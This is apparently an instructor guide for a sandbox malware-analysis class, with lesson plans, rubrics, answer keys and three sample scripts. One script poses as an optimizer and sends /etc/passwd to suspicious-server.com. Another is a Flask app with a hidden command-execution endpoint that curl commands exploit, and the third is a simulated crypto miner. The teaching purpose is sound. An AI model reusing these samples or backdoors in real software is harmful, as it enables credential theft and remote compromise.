# Sandbox Security Analysis - Instructor Guide

## 📚 Overview

This instructor guide provides complete teaching notes, setup instructions, answer keys, and assessment materials for the Sandbox Security Analysis exercise. The exercise teaches students how to safely analyze potentially malicious applications in controlled environments.

**Class Duration**: 3-4 hours  
**Student Level**: Intermediate (basic command line knowledge required)  
**Group Size**: 15-25 students (individual or pairs)

## 🎯 Learning Outcomes

### Primary Objectives
Students will demonstrate ability to:
1. **Explain sandbox analysis concepts** and differentiate from SAST/DAST
2. **Set up secure analysis environments** using containers and monitoring tools
3. **Execute behavioral analysis** using system call tracing and resource monitoring
4. **Identify malicious behavior patterns** in applications and scripts
5. **Document security findings** with evidence and risk assessment

### Assessment Rubric

| Criteria | Excellent (4) | Proficient (3) | Developing (2) | Beginning (1) |
|----------|---------------|----------------|----------------|---------------|
| **Concept Understanding** | Clearly explains sandbox analysis vs other methods | Understands basic concepts with minor gaps | Shows partial understanding | Limited understanding |
| **Technical Execution** | Flawlessly sets up monitoring and executes analysis | Sets up tools correctly with minimal help | Requires some guidance | Needs significant assistance |
| **Threat Identification** | Identifies all malicious behaviors with evidence | Identifies most threats accurately | Identifies some threats | Misses major threats |
| **Documentation** | Professional report with clear evidence | Good documentation with minor gaps | Basic documentation | Poor or incomplete documentation |

## 🛠️ Pre-Class Setup (30 minutes)

### Environment Verification
```bash
# Test Docker environment
docker --version
docker-compose --version

# Start the sandbox environment
cd /workspaces/Docker_Sandbox_Demo/docker
docker-compose up -d

# Verify container access
docker exec -it cybersec_sandbox bash -c "echo 'Sandbox ready'"
```

### Sample Files Preparation
Create these sample files in `/workspaces/Docker_Sandbox_Demo/samples/`:

1. **Suspicious Script** (`suspicious-scripts/suspicious_script.py`):
```python
#!/usr/bin/env python3
import os
import socket
import time
import base64

# Appears to be a system optimizer
print("System Optimizer v1.0 - Improving performance...")

# Hidden malicious behavior
try:
    # Attempt to access sensitive files
    with open('/etc/passwd', 'r') as f:
        users = f.read()
    
    # Try to establish backdoor connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('suspicious-server.com', 4444))
    s.send(base64.b64encode(users.encode()))
    s.close()
    
    # Create hidden file
    with open('/tmp/.hidden_backdoor', 'w') as f:
        f.write("backdoor_installed")
        
except Exception as e:
    pass  # Hide errors

# Legitimate-looking behavior
for i in range(10):
    print(f"Optimizing system component {i+1}/10...")
    time.sleep(1)

print("Optimization complete!")
```

2. **Backdoor Web App** (`backdoor-apps/backdoor_app.py`):
```python
#!/usr/bin/env python3
from flask import Flask, request, render_template_string
import subprocess
import os

app = Flask(__name__)

# Normal web pages
@app.route('/')
def home():
    return "<h1>Welcome to SecureApp</h1><p>A trusted business application</p>"

@app.route('/about')
def about():
    return "<h1>About Us</h1><p>We provide secure business solutions</p>"

@app.route('/contact')
def contact():
    return "<h1>Contact</h1><p>Email: contact@secureapp.com</p>"

# Hidden backdoor endpoint
@app.route('/admin_debug_console')
def backdoor():
    cmd = request.args.get('cmd', 'whoami')
    try:
        result = subprocess.check_output(cmd, shell=True, text=True)
        return f"<pre>{result}</pre>"
    except Exception as e:
        return f"Error: {str(e)}"

# Another hidden endpoint
@app.route('/system_health')
def health():
    return """
    <h2>System Health Check</h2>
    <form action="/admin_debug_console" method="get">
        <input type="text" name="cmd" placeholder="System command">
        <input type="submit" value="Execute">
    </form>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

3. **Crypto Miner Simulation** (`resource-abuse/crypto_miner.py`):
```python
#!/usr/bin/env python3
import hashlib
import time
import random
import threading
import socket

print("Background System Maintenance Tool v2.1")
print("Performing routine system optimization...")

def cpu_intensive_task():
    """Simulate cryptocurrency mining"""
    while True:
        # Generate intensive CPU work
        data = str(random.randint(1, 1000000)).encode()
        for i in range(10000):
            hashlib.sha256(data + str(i).encode()).hexdigest()
        time.sleep(0.01)  # Brief pause

def network_activity():
    """Simulate mining pool connections"""
    servers = ['mining-pool1.com', 'crypto-server.net', 'mining.example.com']
    while True:
        try:
            server = random.choice(servers)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            # These will fail but show up in network monitoring
            s.connect((server, 8333))  # Bitcoin port
            s.close()
        except:
            pass
        time.sleep(30)

# Start multiple threads for high CPU usage
for i in range(4):  # Use 4 CPU cores
    thread = threading.Thread(target=cpu_intensive_task)
    thread.daemon = True
    thread.start()

# Start network activity thread
net_thread = threading.Thread(target=network_activity)
net_thread.daemon = True
net_thread.start()

# Keep main thread alive
try:
    while True:
        print("Maintenance in progress... Please wait.")
        time.sleep(60)
except KeyboardInterrupt:
    print("Maintenance completed.")
```

## 📋 Lesson Plan

### Introduction (30 minutes)

#### Opening Hook (5 minutes)
**Question**: "What would you do if you found a USB drive in the parking lot?"
- Discuss why running unknown software is dangerous
- Introduce the concept of safe analysis environments

#### Sandbox Analysis Overview (15 minutes)
**Key Teaching Points**:
1. **Definition**: Isolated environment for safe software analysis
2. **Comparison**: SAST (code) → DAST (running app) → Sandbox (behavior)
3. **Real-world usage**: Malware analysis, incident response, threat research

**Interactive Demo**:
```bash
# Show the difference between examining and executing
cat suspicious_script.py  # Safe examination
python suspicious_script.py  # Potentially dangerous execution
```

#### Tool Introduction (10 minutes)
**Essential Tools**:
- `strace`: System call monitoring
- `netstat`: Network connection tracking  
- `top`/`htop`: Resource monitoring
- `lsof`: File access tracking

### Hands-On Exercise 1: Basic Behavioral Analysis (45 minutes)

#### Setup Phase (10 minutes)
**Instructor Demonstration**:
```bash
# Enter sandbox environment
docker exec -it cybersec_sandbox bash

# Show monitoring setup
strace -o /tmp/trace.log -f python /samples/suspicious_script.py &
```

**Student Activity**: Students set up their own monitoring environment

#### Analysis Phase (25 minutes)
**Guided Discovery**:
1. **File Access Analysis**:
   ```bash
   grep "openat.*passwd" /tmp/trace.log
   ```
   **Expected Finding**: Unauthorized access to `/etc/passwd`

2. **Network Activity Analysis**:
   ```bash
   grep "connect" /tmp/trace.log
   ```
   **Expected Finding**: Connection attempts to suspicious-server.com

3. **Hidden File Creation**:
   ```bash
   grep "openat.*hidden" /tmp/trace.log
   ```
   **Expected Finding**: Creation of `.hidden_backdoor` file

#### Discussion Phase (10 minutes)
**Key Questions**:
- What behaviors indicate malicious intent?
- How could this malware evade detection?
- What damage could this script cause?

**Answer Key**:
- ✅ Unauthorized file access (`/etc/passwd`)
- ✅ Network exfiltration attempts
- ✅ Hidden backdoor file creation
- ✅ Deceptive user interface (fake optimization)

### Hands-On Exercise 2: Web Application Backdoor Detection (45 minutes)

#### Discovery Phase (20 minutes)
**Student Task**: Find hidden endpoints in the web application

**Instructor Hints** (provide progressively):
1. "Try common directory enumeration"
2. "Look for admin or debug endpoints"
3. "Check for unusual parameter handling"

**Answer Key - Hidden Endpoints**:
- `/admin_debug_console?cmd=whoami`
- `/system_health`

#### Analysis Phase (15 minutes)
**Command Execution Testing**:
```bash
curl "http://localhost:5000/admin_debug_console?cmd=ls%20-la"
curl "http://localhost:5000/admin_debug_console?cmd=cat%20/etc/passwd"
```

**Expected Findings**:
- ✅ Remote command execution capability
- ✅ Access to system files
- ✅ Hidden functionality not in main interface

#### Documentation Phase (10 minutes)
Students document:
- Backdoor location and functionality
- Potential impact and risk level
- Recommended remediation steps

### Hands-On Exercise 3: Resource Abuse Detection (30 minutes)

#### Monitoring Setup (10 minutes)
```bash
# Baseline measurement
top -b -n 1 > baseline.log

# Start the "maintenance tool"
python crypto_miner.py &
MINER_PID=$!
```

#### Resource Analysis (15 minutes)
**Key Metrics to Monitor**:
- CPU usage (should spike to >90%)
- Network connections (suspicious external hosts)
- Process behavior (multiple threads)

**Analysis Commands**:
```bash
# CPU monitoring
top -p $MINER_PID

# Network monitoring  
lsof -p $MINER_PID | grep ESTABLISHED

# Thread analysis
ps -T -p $MINER_PID
```

#### Pattern Recognition (5 minutes)
**Expected Findings**:
- ✅ Sustained high CPU usage across multiple cores
- ✅ Connection attempts to mining-related domains
- ✅ Deceptive naming ("maintenance tool")

### Assessment and Wrap-up (30 minutes)

#### Practical Assessment (20 minutes)
**Scenario**: Students analyze an unknown script and document findings

**Assessment Criteria**:
1. Proper monitoring setup
2. Accurate threat identification
3. Evidence documentation
4. Risk assessment

#### Knowledge Check (10 minutes)
**Quick Quiz Questions**:
1. Which tool monitors system calls? (Answer: strace)
2. What's the main advantage of sandbox analysis? (Answer: Safe execution of untrusted code)
3. Name three types of malicious behavior to monitor (Answer: File access, network activity, resource abuse)

## 🎯 Common Student Challenges

### Technical Issues
**Problem**: Students can't access Docker container
**Solution**: 
```bash
# Check container status
docker ps
# Restart if needed
docker-compose restart cybersec_sandbox
```

**Problem**: Monitoring commands produce too much output
**Solution**: Teach filtering techniques:
```bash
# Filter strace output
strace -e trace=openat,connect python script.py

# Use grep for specific patterns
strace python script.py 2>&1 | grep -E "(passwd|shadow|secret)"
```

### Conceptual Difficulties
**Challenge**: Students confuse sandbox analysis with SAST/DAST
**Teaching Strategy**: Use analogy table and hands-on comparison

**Challenge**: Students miss subtle malicious behaviors
**Teaching Strategy**: Provide guided discovery with progressive hints

## 🔧 Troubleshooting Guide

### Environment Issues
```bash
# Reset sandbox environment
docker-compose down
docker-compose up -d

# Check tool availability
docker exec -it cybersec_sandbox which strace
```

### Sample Script Issues
```bash
# If scripts don't work, check permissions
chmod +x samples/*/*.py

# Verify Python interpreter
docker exec -it cybersec_sandbox python3 --version
```

## 📊 Assessment Answer Keys

### Exercise 1 - Behavioral Analysis
**Expected Findings**:
1. **File Access Violations**: 
   - Access to `/etc/passwd` (High Risk)
   - Creation of hidden files (Medium Risk)

2. **Network Exfiltration**:
   - Connection to external server (High Risk)
   - Data transmission attempt (High Risk)

3. **Deceptive Behavior**:
   - Fake progress indication (Medium Risk)
   - Hidden error suppression (Medium Risk)

### Exercise 2 - Backdoor Detection
**Expected Findings**:
1. **Hidden Endpoints**:
   - `/admin_debug_console` - Command execution
   - `/system_health` - Command interface

2. **Security Impact**:
   - Remote code execution (Critical Risk)
   - System compromise potential (Critical Risk)

### Exercise 3 - Resource Abuse
**Expected Findings**:
1. **Resource Consumption**:
   - CPU usage >90% (High Risk)
   - Multiple concurrent threads (Medium Risk)

2. **Network Indicators**:
   - Mining pool connection attempts (High Risk)
   - Suspicious domain patterns (Medium Risk)

## 📚 Extension Activities

### Advanced Challenges
1. **Multi-stage Malware**: Analyze malware that downloads additional payloads
2. **Evasion Techniques**: Study malware that detects analysis environments
3. **Network Protocol Analysis**: Deep packet inspection of malicious traffic

### Real-World Connections
- **Guest Speaker**: Invite malware analyst or incident responder
- **Case Studies**: Analyze recent malware campaigns (Wannacry, NotPetya)
- **Industry Tools**: Demo commercial sandbox solutions (Cuckoo, Joe Sandbox)

---

**Total Class Time**: 3-4 hours  
**Preparation Time**: 30 minutes  
**Assessment Time**: 20 minutes  
**Cleanup Time**: 10 minutes